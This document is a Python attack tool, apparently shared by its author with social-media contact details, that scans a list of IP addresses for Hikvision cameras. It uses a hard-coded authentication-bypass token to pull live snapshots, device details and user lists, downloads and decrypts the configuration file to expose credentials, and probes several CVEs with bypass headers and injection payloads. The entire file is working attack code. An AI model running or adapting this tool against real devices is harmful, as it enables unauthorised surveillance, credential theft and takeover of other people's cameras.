import requests
import os
import time
from datetime import datetime
import subprocess
import signal
import xml.etree.ElementTree as ET

# Directory paths to check
directory_path = "/onvif-http/snapshot?auth=YWRtaW46MTEK"
device_info_path = "/System/deviceInfo?auth=YWRtaW46MTEK"
user_info_path = "/Security/users?auth=YWRtaW46MTEK"
config_file_path = "/System/configurationFile?auth=YWRtaW46MTEK"

# Create directories to save snapshots, videos, and logs
os.makedirs("logs", exist_ok=True)

# ANSI color codes
class Color:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"

# Global flag to handle interrupt
interrupted = False

# Function to print the banner
def print_banner():
    banner = f"""
{Color.GREEN}
============================================
██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

Contact me on:
Instagram : @hex_buddy
Telegram : @HexBuddy127001
============================================
{Color.RESET}
"""
    print(banner)

# Function to read targets from targets.txt
def read_targets(file_path):
    try:
        with open(file_path, 'r') as file:
            targets = [line.strip() for line in file if line.strip()]
        return targets
    except FileNotFoundError:
        print(f"{Color.RED}[-] Error: {file_path} not found!{Color.RESET}")
        return []

# Function to log information
def log_info(ip_port, message):
    log_dir = os.path.join("logs", ip_port.replace(":", "_") + "_" + datetime.now().strftime('%Y%m%d_%H%M%S'))
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    with open(log_file, 'a') as file:
        file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

# Function to check if a directory is accessible
def check_directory(ip_port):
    url = f"http://{ip_port}{directory_path}"
    try:
        response = requests.head(url, timeout=5)
        if response.status_code == 200:
            message = f"[+] Directory is accessible: {url}"
            print(f"""{Color.YELLOW}
=======================================
============ New Target!! =============
======================================={Color.RESET}

{Color.GREEN}{message}{Color.RESET}""")
            log_info(ip_port, message)
            return url
    except Exception as e:
        message = f"""
[-] Error checking directory: URL {ip_port} Timedout"""
        print(f"{Color.RED}{message}{Color.RESET}")
        log_info(ip_port, message)
    return None

# Function to fetch and parse XML data
def fetch_xml_data(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return ET.fromstring(response.content)
        else:
            message = f"[-] Failed to retrieve XML data from {url}"
            print(f"{Color.YELLOW}{message}{Color.RESET}")
            log_info(url, message)
    except Exception as e:
        message = f"[-] Error fetching XML data: URL {url} Timedout"
        print(f"{Color.RED}{message}{Color.RESET}")
        log_info(url, message)
    return None

# Function to print and log device information
def print_device_info(ip_port):
    url = f"http://{ip_port}{device_info_path}"
    xml_data = fetch_xml_data(url)
    if xml_data is not None:
        message = f"""
[+] Device information for {ip_port}:"""
        print(f"{Color.BLUE}{message}{Color.RESET}")
        log_info(ip_port, message)
        for child in xml_data:
            info = f"{child.tag.split('}')[-1].replace('device', 'Device ')}: {child.text}"
            print(f"{Color.GREEN}{info}{Color.RESET}")
            log_info(ip_port, info)

# Function to print and log user information
def print_user_info(ip_port):
    url = f"http://{ip_port}{user_info_path}"
    xml_data = fetch_xml_data(url)
    if xml_data is not None:
        message = f"""
[+] Users and roles for {ip_port}:"""
        print(f"{Color.BLUE}{message}{Color.RESET}")
        log_info(ip_port, message)
        for user in xml_data:
            username_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userName')
            user_level_element = user.find('.//{http://www.hikvision.com/ver10/XMLSchema}userLevel')

            if username_element is not None and user_level_element is not None:
                username = username_element.text
                user_level = user_level_element.text
                info = f"{username}: {user_level}"
                print(f"{Color.GREEN}{info}{Color.RESET}")
                log_info(ip_port, info)
            else:
                message = f"[-] User or user level information not found for {ip_port}"
                print(f"{Color.YELLOW}{message}{Color.RESET}")
                log_info(ip_port, message)

# Function to download a single snapshot with a unique name
def download_single_snapshot(url, folder):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            filename = os.path.join(folder, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
            with open(filename, 'wb') as f:
                f.write(response.content)
            message = f"""
[+] Snapshot saved: {filename}"""
            print(f"{Color.BLUE}{message}{Color.RESET}")
            log_info(folder, message)
        else:
            message = f"[-] Failed to download snapshot from {url}"
            print(f"{Color.YELLOW}{message}{Color.RESET}")
            log_info(url, message)
    except Exception as e:
        message = f"[-] Error downloading snapshot: URL {url} Timedout"
        print(f"{Color.RED}{message}{Color.RESET}")
        log_info(url, message)

# Function to handle SIGQUIT (Ctrl+\)
def handle_sigquit(sig, frame):
    global interrupted
    interrupted = True
    print(f"{Color.YELLOW}\n[!] Ctrl+\\ detected. Exiting immediately...{Color.RESET}")
    os._exit(0)

# Function to fetch and decrypt configuration file
def fetch_and_decrypt_config(ip_port, folder):
    url = f"http://{ip_port}{config_file_path}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            config_file = os.path.join(folder, "encrypted_configfile.bin")
            with open(config_file, 'wb') as f:
                f.write(response.content)
            message = f"""
[+] Encrypted configuration file saved to: {config_file}"""
            print(f"{Color.BLUE}{message}{Color.RESET}")
            log_info(ip_port, message)
            try:
                # Assuming 'decrypt_configurationFile.py' prints the decrypted content
                decrypted_content = subprocess.check_output(['python3', 'decrypt_configurationFile.py', config_file])
                decrypted_message = f"[+] This is the Decrypted Content : {decrypted_content.decode('utf-8')}"
                print(f"{decrypted_message}")
                log_info(ip_port, decrypted_message)
            except subprocess.CalledProcessError as e:
                message = f"[-] Error decrypting configuration file: {e}"
                print(f"{Color.RED}{message}{Color.RESET}")
                log_info(ip_port, message)
        else:
            message = f"[-] Failed to retrieve configuration file from {url}"
            print(f"{Color.YELLOW}{message}{Color.RESET}")
            log_info(ip_port, message)
    except Exception as e:
        message = f"[-] Error fetching configuration file: {e} ({url})"
        print(f"{Color.RED}{message}{Color.RESET}")
        log_info(ip_port, message)

# Function to perform a GET request with different headers
def perform_get_request(url, headers):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        return response
    except Exception as e:
        return None

# Function to perform a POST request with different payloads
def perform_post_request(url, headers, payload):
    try:
        response = requests.post(url, headers=headers, data=payload, timeout=5)
        return response
    except Exception as e:
        return None

# Function to check for CVE-2021-36260 with various bypasses
def check_cve_2021_36260(ip_port):
    url = f"http://{ip_port}/Security/users"
    bypass_headers = [
        {"User-Agent": "Mozilla/5.0"},
        {"X-Original-URL": "/Security/users"},
        {"X-Rewrite-URL": "/Security/users"}
    ]
    bypass_payloads = [
        """<?xml version="1.0" encoding="UTF-8"?><userCheck><userName>admin</userName><password>admin</password></userCheck>""",
        """<?xml version="1.0" encoding="UTF-8"?><userCheck><userName>admin' OR '1'='1</userName><password>admin</password></userCheck>""",
        """<?xml version="1.0" encoding="UTF-8"?><userCheck><userName>admin"><password>admin</password></userCheck>"""
    ]
    try:
        vulnerable = False
        print(f"{Color.GREEN}========= CVE-2021-36260 Check ========={Color.RESET}")
        for headers in bypass_headers:
            response = perform_get_request(url, headers)
            if response and response.status_code == 200:
                messageblue = f"""
[+] Target {ip_port} is vulnerable to CVE-2021-36260"""
                print(f"{Color.BLUE}{messageblue}{Color.RESET}")
                log_info(ip_port, messageblue)
                print(f"{Color.YELLOW}[-] Response status code: {response.status_code}{Color.RESET}")
                print(f"{Color.YELLOW}[-] Response content: {response.content.decode('utf-8')}{Color.RESET}")
                log_info(ip_port, f"[-] Response status code: {response.status_code}")
                log_info(ip_port, f"[-] Response content: {response.content.decode('utf-8')}")
                vulnerable = True
                break
        if not vulnerable:
            for payload in bypass_payloads:
                response = perform_post_request(url, {}, payload)
                if response and response.status_code == 200:
                    messageblue = f"""
[+] Target {ip_port} is vulnerable to CVE-2021-36260"""
                    print(f"{Color.BLUE}{messageblue}{Color.RESET}")
                    log_info(ip_port, messageblue)
                    print(f"{Color.YELLOW}[-] Response status code: {response.status_code}{Color.RESET}")
                    print(f"{Color.YELLOW}[-] Response content: {response.content.decode('utf-8')}{Color.RESET}")
                    log_info(ip_port, f"[-] Response status code: {response.status_code}")
                    log_info(ip_port, f"[-] Response content: {response.content.decode('utf-8')}")
                    vulnerable = True
                    break
        if not vulnerable:
            messagered = f"""
[-] Target {ip_port} is not vulnerable to CVE-2021-36260"""
            print(f"{Color.RED}{messagered}{Color.RESET}")
            log_info(ip_port, messagered)
            print(f"{Color.YELLOW}[-] Response status code: {response.status_code}{Color.RESET}")
            print(f"{Color.YELLOW}[-] Response content: {response.content.decode('utf-8')}{Color.RESET}")
            log_info(ip_port, f"[-] Response status code: {response.status_code}")
            log_info(ip_port, f"[-] Response content: {response.content.decode('utf-8')}")
    except Exception as e:
        messageerror = f"[-] Error checking CVE-2021-36260: {e} ({url})"
        print(f"{Color.RED}{messageerror}{Color.RESET}")
        log_info(ip_port, messageerror)

# Function to check for CVE-2017-7921 with various bypasses
def check_cve_2017_7921(ip_port):
    url = f"http://{ip_port}/Security/userCheck"
    bypass_payloads = [
        """<userCheck><userName>admin</userName><password>admin</password></userCheck>""",
        """<userCheck><userName>admin' OR '1'='1</userName><password>admin</password></userCheck>""",
        """<userCheck><userName>admin"><password>admin</password></userCheck>"""
    ]
    try:
        vulnerable = False
        print(f"{Color.GREEN}========= CVE-2017-7921 Check ========={Color.RESET}")
        for payload in bypass_payloads:
            response = perform_post_request(url, {"Content-Type": "application/xml"}, payload)
            if response and response.status_code == 200:
                message = f"""
[+] Target {ip_port} is vulnerable to CVE-2017-7921"""
                print(f"{Color.BLUE}{message}{Color.RESET}")
                log_info(ip_port, message)
                vulnerable = True
                break
        if not vulnerable:
            messagered = f"""
[-] Target {ip_port} is not vulnerable to CVE-2017-7921"""
            print(f"{Color.RED}{messagered}{Color.RESET}")
            log_info(ip_port, messagered)
            print(f"{Color.YELLOW}[-] Response status code: {response.status_code}{Color.RESET}")
            print(f"{Color.YELLOW}[-] Response content: {response.content.decode('utf-8')}{Color.RESET}")
            log_info(ip_port, f"[-] Response status code: {response.status_code}")
            log_info(ip_port, f"[-] Response content: {response.content.decode('utf-8')}")
    except Exception as e:
        message = f"[-] Error checking CVE-2017-7921: {e} ({url})"
        print(f"{Color.RED}{message}{Color.RESET}")
        log_info(ip_port, message)

# Function to check for CVE-2022-28171 with various bypasses
def check_cve_2022_28171(ip_port):
    url = f"http://{ip_port}/ISAPI/Security/userCheck"
    bypass_payloads = [
        """<userCheck><userName>admin</userName><password>admin</password></userCheck>""",
        """<userCheck><userName>admin' OR '1'='1</userName><password>admin</password></userCheck>""",
        """<userCheck><userName>admin"><password>admin</password></userCheck>"""
    ]
    try:
        vulnerable = False
        print(f"{Color.GREEN}========= CVE-2022-28171 Check ========={Color.RESET}")
        for payload in bypass_payloads:
            response = perform_post_request(url, {"Content-Type": "application/xml"}, payload)
            if response and response.status_code == 200:
                message = f"""
[+] Target {ip_port} is vulnerable to CVE-2022-28171"""
                print(f"{Color.BLUE}{message}{Color.RESET}")
                log_info(ip_port, message)
                vulnerable = True
                break
        if not vulnerable:
            messagered = f"""
[-] Target {ip_port} is not vulnerable to CVE-2022-28171"""
            print(f"{Color.RED}{messagered}{Color.RESET}")
            log_info(ip_port, messagered)
            print(f"{Color.YELLOW}[-] Response status code: {response.status_code}{Color.RESET}")
            print(f"{Color.YELLOW}[-] Response content: {response.content.decode('utf-8')}{Color.RESET}")
            log_info(ip_port, f"[-] Response status code: {response.status_code}")
            log_info(ip_port, f"[-] Response content: {response.content.decode('utf-8')}")
    except Exception as e:
        message = f"[-] Error checking CVE-2022-28171: {e} ({url})"
        print(f"{Color.RED}{message}{Color.RESET}")
        log_info(ip_port, message)

# Function to check for CVE-2021-36260, CVE-2017-7921, and CVE-2022-28171 with bypasses
def check_all_cves(ip_port):
    check_cve_2021_36260(ip_port)
    check_cve_2017_7921(ip_port)
    check_cve_2022_28171(ip_port)
    print(f"{Color.GREEN}========= Done With {ip_port} ========={Color.RESET}")

# Main function
def main():
    print_banner()
    targets = read_targets("targets.txt")
    for ip_port in targets:
        if interrupted:
            break
        folder = f"logs/{ip_port.replace(':', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(folder, exist_ok=True)
        if interrupted:
            break
        directory_url = check_directory(ip_port)
        if directory_url:
            print_device_info(ip_port)
            print_user_info(ip_port)
            download_single_snapshot(directory_url, folder)
            fetch_and_decrypt_config(ip_port, folder)
            check_all_cves(ip_port)      

if __name__ == "__main__":
    signal.signal(signal.SIGQUIT, handle_sigquit)
    main()
